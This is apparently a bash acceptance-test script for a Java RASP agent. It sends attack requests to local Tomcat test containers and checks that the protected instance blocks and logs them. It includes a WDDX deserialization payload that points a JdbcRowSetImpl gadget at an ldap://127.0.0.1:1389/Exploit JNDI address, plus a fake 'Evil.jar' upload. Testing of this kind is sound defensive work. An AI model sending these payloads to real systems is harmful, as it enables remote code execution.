#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

compose=(docker compose -f docker-compose.java11.yml)
if [[ -n "${OHMYRASP_JAVA11_TOMCAT_VERSIONS:-}" ]]; then
  read -r -a versions <<< "$OHMYRASP_JAVA11_TOMCAT_VERSIONS"
else
  versions=(10 9)
fi
services=()

for version in "${versions[@]}"; do
  services+=("tomcat${version}-java11-baseline" "tomcat${version}-java11-protected")
done

baseline_port() {
  case "$1" in
    10) echo "${OHMYRASP_TOMCAT10_JAVA11_BASELINE_PORT:-18110}" ;;
    9) echo "${OHMYRASP_TOMCAT9_JAVA11_BASELINE_PORT:-18088}" ;;
    *) echo "unsupported Java 11 Tomcat version: $1" >&2; exit 1 ;;
  esac
}

protected_port() {
  case "$1" in
    10) echo "${OHMYRASP_TOMCAT10_JAVA11_PROTECTED_PORT:-18111}" ;;
    9) echo "${OHMYRASP_TOMCAT9_JAVA11_PROTECTED_PORT:-18089}" ;;
    *) echo "unsupported Java 11 Tomcat version: $1" >&2; exit 1 ;;
  esac
}

for version in "${versions[@]}"; do
  rm -rf "logs/tomcat${version}-java11-baseline" "logs/tomcat${version}-java11-protected"
  mkdir -p "logs/tomcat${version}-java11-baseline" "logs/tomcat${version}-java11-protected"
done

"${compose[@]}" build --pull "${services[@]}"
"${compose[@]}" up -d "${services[@]}"

cleanup() {
  for version in "${versions[@]}"; do
    "${compose[@]}" logs --no-color "tomcat${version}-java11-baseline" \
      > "logs/tomcat${version}-java11-baseline/tomcat.log" || true
    "${compose[@]}" logs --no-color "tomcat${version}-java11-protected" \
      > "logs/tomcat${version}-java11-protected/tomcat.log" || true
  done
  "${compose[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local url="$2"
  for _ in $(seq 1 120); do
    if curl -fsS "${url}/rasp/health" >/dev/null 2>&1; then
      return
    fi
    sleep 1
  done
  echo "${name} did not become healthy at ${url}" >&2
  exit 1
}

typed_payload_body() {
  printf "%s" "argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://127.0.0.1:1389/Exploit</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>"
}

run_baseline() {
  local version="$1"
  local url="$2"
  local dir="logs/tomcat${version}-java11-baseline"
  local upload_file="${dir}/java-archive-upload.jar"
  printf 'PK\003\004ohmyrasp-java11-upload' > "$upload_file"
  curl -fsS "${url}/rasp/java11/normal" > "${dir}/normal.response"
  curl -fsS "${url}/rasp/java11/command" > "${dir}/command.response"
  curl -fsS "${url}/rasp/java11/command-shell" > "${dir}/command_shell.response"
  curl -fsS "${url}/rasp/java11/jndi" > "${dir}/jndi.response"
  curl -fsS -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "$(typed_payload_body)" \
    "${url}/rasp/java11/typed-payload" > "${dir}/typed_payload.response"
  if ! grep -q "java11 typed payload attempted" "${dir}/typed_payload.response"; then
    cat "${dir}/typed_payload.response" >&2
    echo "baseline tomcat${version}-java11 typed payload did not reach endpoint" >&2
    exit 1
  fi
  curl -fsS "${url}/rasp/java11/deserialization" > "${dir}/deserialization.response"
  curl -fsS "${url}/rasp/java11/file-read" > "${dir}/file_read.response"
  curl -fsS "${url}/rasp/java11/file-write" > "${dir}/file_write.response"
  curl -fsS "${url}/rasp/java11/archive-traversal" > "${dir}/archive_traversal.response"
  curl -fsS "${url}/rasp/java11/ssrf-metadata" > "${dir}/ssrf_metadata.response"
  curl -fsS "${url}/rasp/java11/ssrf-loopback" > "${dir}/ssrf_loopback.response"
  curl -fsS "${url}/rasp/java11/classloader" > "${dir}/classloader.response"
  curl -fsS "${url}/rasp/java11/rmi-classloader" > "${dir}/rmi_classloader.response"
  curl -fsS "${url}/rasp/java11/jdbc-h2" > "${dir}/jdbc_h2.response"
  curl -fsS "${url}/rasp/java11/jdbc-derby" > "${dir}/jdbc_derby.response"
  curl -fsS "${url}/rasp/java11/jdbc-mysql" > "${dir}/jdbc_mysql.response"
  curl -fsS "${url}/rasp/java11/script" > "${dir}/script.response"
  curl -fsS "${url}/rasp/java11/compile" > "${dir}/compile.response"
  curl -fsS "${url}/rasp/java11/jaas" > "${dir}/jaas.response"
  curl -fsS "${url}/rasp/java11/jmx-remote-config" > "${dir}/jmx_remote_config.response"
  curl -fsS "${url}/rasp/java11/jmx-file-write" > "${dir}/jmx_file_write.response"
  curl -fsS "${url}/rasp/java11/xml-decoder-runtime" > "${dir}/xml_decoder_runtime.response"
  curl -fsS "${url}/rasp/java11/xml-decoder-webshell" > "${dir}/xml_decoder_webshell.response"
  curl -fsS "${url}/rasp/java11/xxe-file" > "${dir}/xxe_file.response"
  curl -fsS \
    -F "file=@${upload_file};filename=Evil.jar;type=application/java-archive" \
    "${url}/rasp/java11/plugin/add" > "${dir}/upload_java_archive.response"
  if ! grep -q "java11 upload attempted 1" "${dir}/upload_java_archive.response"; then
    cat "${dir}/upload_java_archive.response" >&2
    echo "baseline tomcat${version}-java11 upload did not reach multipart endpoint" >&2
    exit 1
  fi
}

verify_startup_and_normal() {
  local version="$1"
  local url="$2"
  local log="logs/tomcat${version}-java11-protected/events.jsonl"
  curl -fsS "${url}/rasp/java11/normal" > "logs/tomcat${version}-java11-protected/normal.response"

  if ! grep -q '"event":"ohmyrasp-java11-agent-start"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 startup probe event on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"instrumentation":"available"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 instrumentation availability on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"request_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 request hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"file_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 file hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"upload_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 upload hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"archive_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 archive hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"url_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 URL hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"classloader_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 classloader hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"jdbc_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 JDBC hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"script_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 script hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"java_compile_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 Java compilation hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"jaas_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 JAAS hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"jmx_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 JMX hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"java_beans_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 JavaBeans hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if ! grep -q '"xxe_hook":"installed"' "$log"; then
    cat "$log" >&2
    echo "missing Java 11 XXE hook startup marker on Tomcat ${version}" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$log"; then
    cat "$log" >&2
    echo "Java 11 normal traffic produced a detection on Tomcat ${version}" >&2
    exit 1
  fi
}

expect_block() {
  local version="$1"
  local name="$2"
  local algorithm="$3"
  local path="$4"
  local url="http://localhost:$(protected_port "$version")"
  local log="logs/tomcat${version}-java11-protected/events.jsonl"
  local status
  status="$(curl -sS -o "logs/tomcat${version}-java11-protected/${name}.response" \
    -w "%{http_code}" "${url}${path}" || true)"
  if [[ "$status" =~ ^2 ]]; then
    echo "protected tomcat${version}-java11 ${name} unexpectedly returned ${status}" >&2
    cat "logs/tomcat${version}-java11-protected/${name}.response" >&2
    exit 1
  fi
  if ! grep -q "\"algorithm\":\"${algorithm}\".*\"action\":\"block\"" "$log"; then
    cat "$log" >&2
    echo "missing protected tomcat${version}-java11 ${name} block event for ${algorithm}" >&2
    exit 1
  fi
  echo "blocked tomcat${version}-java11 ${name}"
}

expect_block_form() {
  local version="$1"
  local name="$2"
  local algorithm="$3"
  local path="$4"
  local url="http://localhost:$(protected_port "$version")"
  local log="logs/tomcat${version}-java11-protected/events.jsonl"
  local status
  status="$(curl -sS -o "logs/tomcat${version}-java11-protected/${name}.response" \
    -w "%{http_code}" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "$(typed_payload_body)" \
    "${url}${path}" || true)"
  if [[ "$status" =~ ^2 ]]; then
    echo "protected tomcat${version}-java11 ${name} unexpectedly returned ${status}" >&2
    cat "logs/tomcat${version}-java11-protected/${name}.response" >&2
    exit 1
  fi
  if ! grep -q "\"algorithm\":\"${algorithm}\".*\"action\":\"block\"" "$log"; then
    cat "$log" >&2
    echo "missing protected tomcat${version}-java11 ${name} block event for ${algorithm}" >&2
    exit 1
  fi
  echo "blocked tomcat${version}-java11 ${name}"
}

expect_block_upload() {
  local version="$1"
  local name="$2"
  local algorithm="$3"
  local url="http://localhost:$(protected_port "$version")"
  local log="logs/tomcat${version}-java11-protected/events.jsonl"
  local upload_file="logs/tomcat${version}-java11-protected/java-archive-upload.jar"
  local status
  printf 'PK\003\004ohmyrasp-java11-upload' > "$upload_file"
  status="$(curl -sS -o "logs/tomcat${version}-java11-protected/${name}.response" \
    -w "%{http_code}" \
    -F "file=@${upload_file};filename=Evil.jar;type=application/java-archive" \
    "${url}/rasp/java11/plugin/add" || true)"
  if [[ "$status" =~ ^2 ]] \
      && grep -q "java11 upload attempted 1" "logs/tomcat${version}-java11-protected/${name}.response"; then
    echo "protected tomcat${version}-java11 ${name} unexpectedly returned ${status}" >&2
    cat "logs/tomcat${version}-java11-protected/${name}.response" >&2
    exit 1
  fi
  if ! grep -q "\"algorithm\":\"${algorithm}\".*\"action\":\"block\"" "$log"; then
    cat "$log" >&2
    echo "missing protected tomcat${version}-java11 ${name} block event for ${algorithm}" >&2
    exit 1
  fi
  echo "blocked tomcat${version}-java11 ${name}"
}

for version in "${versions[@]}"; do
  baseline_url="http://localhost:$(baseline_port "$version")"
  protected_url="http://localhost:$(protected_port "$version")"
  wait_for "tomcat${version}-java11-baseline" "$baseline_url"
  wait_for "tomcat${version}-java11-protected" "$protected_url"
  run_baseline "$version" "$baseline_url"
  verify_startup_and_normal "$version" "$protected_url"
  expect_block "$version" command java11_command_execution_exploit_primitive /rasp/java11/command
  expect_block "$version" command_shell java11_command_execution_shell_meta /rasp/java11/command-shell
  expect_block "$version" jndi java11_jndi_remote_lookup /rasp/java11/jndi
  expect_block_form "$version" typed_payload java11_request_typed_payload_deserialization /rasp/java11/typed-payload
  expect_block "$version" deserialization java11_deserialization_gadget_class /rasp/java11/deserialization
  expect_block "$version" file_read java11_file_sensitive_read /rasp/java11/file-read
  expect_block "$version" file_write java11_file_script_write /rasp/java11/file-write
  expect_block "$version" archive_traversal java11_archive_entry_traversal_write /rasp/java11/archive-traversal
  expect_block "$version" ssrf_metadata java11_ssrf_cloud_metadata /rasp/java11/ssrf-metadata
  expect_block "$version" ssrf_loopback java11_ssrf_loopback_admin /rasp/java11/ssrf-loopback
  expect_block "$version" classloader java11_classloader_remote_codebase /rasp/java11/classloader
  expect_block "$version" rmi_classloader java11_classloader_remote_codebase /rasp/java11/rmi-classloader
  expect_block "$version" jdbc_h2 java11_jdbc_h2_code_execution /rasp/java11/jdbc-h2
  expect_block "$version" jdbc_derby java11_jdbc_derby_code_loading /rasp/java11/jdbc-derby
  expect_block "$version" jdbc_mysql java11_jdbc_mysql_deserialization /rasp/java11/jdbc-mysql
  expect_block "$version" script java11_script_engine_runtime_execution /rasp/java11/script
  expect_block "$version" compile java11_java_compile_runtime_execution /rasp/java11/compile
  expect_block "$version" jaas java11_jaas_jndi_remote_provider /rasp/java11/jaas
  expect_block "$version" jmx_remote_config java11_jmx_remote_config_source /rasp/java11/jmx-remote-config
  expect_block "$version" jmx_file_write java11_jmx_script_file_write /rasp/java11/jmx-file-write
  expect_block "$version" xml_decoder_runtime java11_xml_decoder_runtime_execution /rasp/java11/xml-decoder-runtime
  expect_block "$version" xml_decoder_webshell java11_xml_decoder_script_file_write /rasp/java11/xml-decoder-webshell
  expect_block "$version" xxe_file java11_xxe_external_entity_protocol /rasp/java11/xxe-file
  expect_block_upload "$version" upload_java_archive fileUpload_java_archive
done

echo "java11 acceptance passed on Tomcat versions: ${versions[*]} baseline/protected containers"
